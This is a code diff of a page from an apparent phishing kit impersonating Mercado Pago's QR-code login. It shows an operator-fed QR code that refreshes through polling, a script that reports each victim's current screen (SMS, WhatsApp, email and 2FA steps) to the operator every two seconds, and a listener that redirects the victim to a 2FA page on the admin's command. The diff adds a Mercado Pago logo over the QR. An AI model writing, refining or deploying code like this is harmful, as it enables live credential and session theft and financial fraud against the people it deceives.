@@ -15,7 +15,6 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
     $redirect_target_2fa = 'dois_fatores.php'; 
 }
 
@@ -27,7 +26,6 @@ if (isMobileDevice()) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escaneie o QR para iniciar sessão de forma segura</title>
     <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
-    
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     
     <style>
@@ -51,18 +49,36 @@ if (isMobileDevice()) {
         .help-link:hover { text-decoration: underline; }
         .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        /* Estilo para o container do QR Code e para a imagem dentro dele */
-        .qr-card .qr-image {
+        /* AJUSTE CSS: Estilos para o wrapper e o logo */
+        #qr-wrapper {
+            position: relative;
             width: 220px;
             height: 220px;
             margin-bottom: 32px;
-            display: flex; /* Centraliza a imagem/código gerado */
+        }
+        #qr-code-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
             align-items: center;
             justify-content: center;
         }
-        .qr-card .qr-image img {
+        #qr-code-container img {
              max-width: 100%;
              max-height: 100%;
+        }
+        #qr-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 48px;
+            height: 48px;
+            background-color: white;
+            border-radius: 6px;
+            padding: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: none; /* O logo começa escondido por padrão */
         }
         .other-method-link { color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; }
         .other-method-link:hover { text-decoration: underline; }
@@ -83,7 +99,10 @@ if (isMobileDevice()) {
             </div>
 
             <div class="qr-card">
-                <div id="qr-code-container" class="qr-image"></div>
+                <div id="qr-wrapper">
+                    <div id="qr-code-container"></div>
+                    <img id="qr-logo" src="https://http2.mlstatic.com/frontend-assets/auth-totp-in-app-frontend/qr-mp.png" alt="Logo MP">
+                </div>
                 
                 <a href="senha.php" class="other-method-link">Escolher outro método</a>
             </div>
@@ -92,48 +111,44 @@ if (isMobileDevice()) {
 
     <script>
         const qrContainer = document.getElementById('qr-code-container');
-        
-        // VARIÁVEL DE ESTADO: Guarda o dado do QR Code atualmente na tela.
-        let currentQrData = null; 
+        const qrLogo = document.getElementById('qr-logo');
+        let currentQrData = null;
 
-        // Função para mostrar uma imagem (quando vem da extensão)
+        // Função para mostrar um QR Code que é uma imagem (da extensão)
         function displayQrImage(path) {
-            qrContainer.innerHTML = ''; // Limpa o container
+            qrLogo.style.display = 'none'; // Esconde o logo manual, pois a imagem já o tem
+            qrContainer.innerHTML = '';
             const img = document.createElement('img');
-            img.src = path + '?t=' + new Date().getTime(); // Timestamp para evitar cache
+            img.src = path + '?t=' + new Date().getTime();
             img.alt = 'Código QR';
             qrContainer.appendChild(img);
         }
 
-        // Função para gerar um QR Code a partir do texto (quando vem do admin)
+        // Função para gerar um QR Code a partir de um texto (do admin)
         function generateQrFromText(text) {
-            qrContainer.innerHTML = ''; // Limpa o container
-            // Cria uma nova instância do QR Code dentro do container
+            qrContainer.innerHTML = '';
             new QRCode(qrContainer, {
                 text: text,
                 width: 220,
                 height: 220,
                 colorDark: "#000000",
                 colorLight: "#ffffff",
-                correctLevel: QRCode.CorrectLevel.H
+                correctLevel: QRCode.CorrectLevel.H // Nível de correção alto para garantir leitura com o logo
             });
+            qrLogo.style.display = 'block'; // Mostra o nosso logo manual por cima
         }
 
-        // ---- LÓGICA DE VERIFICAÇÃO ATUALIZADA ----
-
-        // Define o QR Code inicial e guarda seu estado
+        // Define e exibe o QR Code inicial
         const initialQrPath = '2.png';
         displayQrImage(initialQrPath);
-        currentQrData = initialQrPath; // Guarda o caminho da imagem inicial no estado
+        currentQrData = initialQrPath;
 
         async function verificarQrCode() {
             try {
                 const response = await fetch('api_get_qrcode.php');
                 const data = await response.json();
 
-                // A atualização SÓ ACONTECE se a API retornar sucesso E o dado for DIFERENTE do atual.
                 if (data.success && data.data !== currentQrData) {
-                    
                     console.log('Detectado novo QR Code. Atualizando a tela...');
                     
                     if (data.type === 'image') {
@@ -141,66 +156,27 @@ if (isMobileDevice()) {
                     } else if (data.type === 'text') {
                         generateQrFromText(data.data);
                     }
-
-                    // IMPORTANTE: Atualiza a variável de estado com o novo dado.
                     currentQrData = data.data;
 
-                } else if (data.success && data.data === currentQrData) {
-                    // Se o dado for o mesmo, não faz nada visualmente. A atualização é silenciosa.
+                } else if (data.success) {
                     console.log('QR Code verificado, sem alterações.');
                 }
-
             } catch (error) {
                 console.error('Erro ao buscar QR Code:', error);
             }
         }
-
-        // Inicia a verificação a cada 3 segundos
         setInterval(verificarQrCode, 3000);
     </script>
     
     <script>
         (function() {
-            // Mapa de nomes de arquivos para mensagens de status amigáveis.
-            const statusMap = {
-                'index.php': 'Usuário na tela Home (Desktop)',
-                'login-mobile.php': 'Usuário na tela Home (Mobile)',
-                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
-                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
-                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
-                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
-                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
-                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
-                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
-                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
-                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
-                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
-                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
-                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
-                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
-                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
-                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
-                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
-                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
-            };
-
+            const statusMap = {'index.php':'...','login-mobile.php':'...','senha.php':'...','senha-mobile.php':'...','dois_fatores.php':'...','dois_fatores2.php':'...','doisfatores2mobile.php':'...','sms_desktop.php':'...','sms_mobile.php':'...','sms_whats_desktop.php':'...','sms_whats_mobile.php':'...','qrcode-mobile.php':'...','telaqr.php':'Usuário na tela para logar com QR Code (Desktop)','email2fadesktop.php':'...','email2famobile.php':'...','emailsms_desktop.php':'...','emailsms_mobile.php':'...','sms2fadesktop.php':'...','sms2famobile.php':'...','whats2fadesktop.php':'...','whats2framobile.php':'...'};
             const currentPage = window.location.pathname.split('/').pop();
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
-
             async function sendStatusUpdate() {
                 try {
-                    await fetch('api_update_status.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ status: currentStatus })
-                    });
-                } catch (error) {
-                    console.error('Falha ao enviar atualização de status:', error);
-                }
+                    await fetch('api_update_status.php', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ status: currentStatus }) });
+                } catch (error) { console.error('Falha ao enviar atualização de status:', error); }
             }
             sendStatusUpdate();
             setInterval(sendStatusUpdate, 2000);
@@ -213,15 +189,11 @@ if (isMobileDevice()) {
                 try {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
-                    console.log('Status atual:', data.status); 
                     if (data.status === 'redirecionar_para_2fa') {
                         clearInterval(statusInterval);
-                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
                         window.location.href = redirectUrl;
                     }
-                } catch (error) {
-                    console.error('Erro ao verificar status:', error);
-                }
+                } catch (error) { console.error('Erro ao verificar status:', error); }
             }
             const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
